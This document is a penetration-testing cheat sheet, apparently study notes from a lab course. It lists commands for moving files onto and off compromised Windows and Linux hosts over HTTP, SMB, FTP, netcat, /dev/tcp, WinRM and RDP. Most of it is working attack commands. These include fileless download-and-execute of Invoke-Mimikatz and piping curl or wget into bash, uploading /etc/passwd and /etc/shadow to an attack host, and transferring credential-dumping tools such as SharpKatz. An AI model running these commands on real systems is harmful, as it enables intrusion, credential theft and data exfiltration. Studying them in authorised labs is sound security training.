## Windows
### PowerShell Base64 Encode & Decode
##### While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

#### Bash terminal -Encode:
1. md5sum id_rsa -> 4e301756a07ded0a2dd6953abf015278
2. cat id_rsa | base64 -w 0;echo -> we are getting somevalue
   
#### Windows PowerShell terminal - Decode:
3. PS C:\User> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("somevalue"))
4. Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
---
#### Windows PowerShell terminal - base64 Encode:
1. C:\User> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
2. Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash = get some hash value

#### Bash terminal - base64 Decode:
3. echo somevalue| base64 -d > hosts
4. md5sum hosts 
   

### PowerShell Web Downloads
[System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
1.  C:\User>(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
2.  C:\User> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
3.  C:\User> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

### PowerShell DownloadString - Fileless Method
##### As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |
| `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`                                  | additional command to bypass if we are facing with error related to SSL/TLS channel if the certificate is not trusted   |
|  `Invoke-WebRequest https://<something>/PowerView.ps1 -OutFile PowerView.ps1`                                      | Download a file with PowerShell.  PS onwards 3.0             |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing \| IEX')`                                            | -UseBasicParsing helps with bypass errors in IE  |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                   | Download a file using Bitsadmin             |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |

[harmj0y PS extensive list](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Linux DownloadString - Fileless Method

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`                              | Fileless Download with cURL                 |
| `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`         | Fileless Download with wget                 |

#### Download with Bash (/dev/tcp)

| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| ` exec 3<>/dev/tcp/10.10.10.32/80`                              | Connect to the Target Webserver                 |
| `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3 ; cat <&3`         | HTTP GET Request  & Print the Response               |

### SMB Downloads
#### We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

1. Create the SMB Server - sudo impacket-smbserver share -smb2support /tmp/smbshare
2. Copy a File from the SMB Server - C:\User> copy \\192.168.220.133\share\nc.exe = New versions of Windows block unauthenticated guest access, as we can see in the following command (set a username and password):
3. sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
4. Mount the SMB Server with Username and Password - C:\User> net use n: \\192.168.220.133\share /user:test test

### FTP Downloads
#### We can configure an FTP Server in our attack host using Python3 pyftpdlib module. It can be installed with the following command:

1. Installing the FTP Server Python3 Module - pyftpdlib = sudo pip3 install pyftpdlib
2. Setting up a Python3 FTP Server = sudo python3 -m pyftpdlib --port 21
3. Transfering Files from an FTP Server Using PowerShell = PS C:\User> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
4. When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
5. `C:\User> echo open 192.168.49.128 > ftpcommand.txt
6. When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file. Create a Command File for the FTP Client and Download the Target File
```
C:\User> echo USER anonymous >> ftpcommand.txt
C:\User> echo binary >> ftpcommand.txt
C:\User> echo GET file.txt >> ftpcommand.txt
C:\User> echo bye >> ftpcommand.txt
C:\User> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\User>more file.txt
This is a test file
```

### Powershell Uploads
#### PowerShell Base64 Encode & Decode
1. PS C:\User> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
2. PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash   => we are getting some base64 value

##### Attack bash machine:
1. echo somevalue| base64 -d > hosts
2. md5sum hosts => getting value

#### Powershell Web Uploads
1. pip3 install uploadserver  ==> https://github.com/Densaugeo/uploadserver ==> sudo python3 -m pip install --user uploadserver
2. python3 -m uploadserver
3. IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
4. Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

#### Powershell Web Uploads
1.  $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
2.  Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
3.  nc -lvnp 8000
4.  echo <base64> | base64 -d -w 0 > hosts

### SMB Uploads
1. C:\User> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\ = and we have alternative to run SMB:
1. An alternative is to run SMB over HTTP with WebDav. WebDAV. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
2. sudo pip3 install wsgidav cheroot
3. sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
4. C:\User> dir \\192.168.49.128\DavWWWRoot  = DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver


### FTP Uploads
1. Linux: sudo python3 -m pyftpdlib --port 21 --write
2. PS C:\User> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
3. 
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
---
### Web Upload
1. sudo python3 -m pip install --user uploadserver
2. openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
3. mkdir https && cd https  ==> The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
4. sudo python3 -m uploadserver 443 --server-certificate ~/server.pem  ==> Now from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.
5. curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure  ==> upload multiple files
6. Alternative Web File Transfer method:
7. python3 -m http.server = Creating a Web Server with Python3
8. python2.7 -m SimpleHTTPServer  == Creating a Web Server with Python2.7
9. php -S 0.0.0.0:8000 == Creating a Web Server with PHP
10. ruby -run -ehttpd . -p8000  == Creating a Web Server with Ruby

---
### Transferring Files with Code
#### Python Download
1.  python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
2.  python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
#### Python Upload
1. python3 -m uploadserver
2. python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
#### PHP Download
1. php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
2. php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
3. php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
#### Ruby Download
1. ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
#### Perl Download
1. perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
#### Javascript Download 
[userful direction how to download files from Linux/Windows OS](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068)
1. wget.js
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
2. C:\User> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1 
#### VBScript
1. [Download a file with VBS](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs)
2. wget.vbs
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
3. C:\User> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
---

### Linux
| **Command**                                                                                                        | **Description**                             |
| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `sudo systemctl enable ssh ; sudo systemctl start ssh ; netstat -lnpt`                                             | Enabling, Starting, and checking for SSH listening port           |
| `scp plaintext@192.168.49.128:/root/myroot.txt . `                                                                  | Download a file using SCP                     |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |
| `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`                                                     | Upload a file using SCP                     |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe`                                                           | Download a file using SCP                   |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |

### Miscellaneous File Transfer Methods
#### File transfer ith Netcat and Ncat
1. Listening on Compromised machine ==>  nc -l -p 8000 > SharpKatz.exe   or   ncat -l -p 8000 --recv-only > SharpKatz.exe
2. Attack Host - Sending File to Compromised machine:
3. wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
4. nc -q 0 192.168.49.128 8000 < SharpKatz.exe ; -q 0 tell Netcat to close the connection once it finishes.

#### Sending file as input - This method is useful in scenarios where there's a firewall blocking inbound connections**
   
1. Attack Host: - sudo nc -l -p 443 -q 0 < SharpKatz.exe
2. Compromised Machine: nc 192.168.49.128 443 > SharpKatz.exe
3. The same we can do with Ncat:
4. Attack Host - sudo ncat -l -p 443 --send-only < SharpKatz.exe
5. Compromised Machine - ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

#### If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/(https://tldp.org/LDP/abs/html/devref1.html).
1. NetCat - Sending File as Input to Netcat = sudo nc -l -p 443 -q 0 < SharpKatz.exe
2. Ncat - Sending File as Input to Netcat = sudo ncat -l -p 443 --send-only < SharpKatz.exe
3. Compromised machine: cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

#### PowerShell Session File Transfer
*The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS. To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.
We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM. *
1. From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01 = hostname;whoami
2. Test-NetConnection -ComputerName DATABASE01 -Port 5985
3. Create a PowerShell Remoting Session to DATABASE01 = $Session = New-PSSession -ComputerName DATABASE01
4. Copy samplefile.txt from our Localhost to the DATABASE01 Session = Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
5. Copy DATABASE.txt from DATABASE01 Session to our Localhost = Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

#### RDP
1. Mounting a Linux Folder Using rdesktop = rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
2. Mounting a Linux Folder Using xfreerdp = xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
3. on Windows PC = To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.
4. Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.

### File Encryption
#### Windows
1. [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)
2. Once you transfer script -> Import-Module .\Invoke-AESEncryption.ps1
3. Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
   
#### Linux
1. Encrypting /etc/passwd with openssl: openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc  = [OpenSSL page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html)
2. Decrypt passwd.enc with openssl: openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
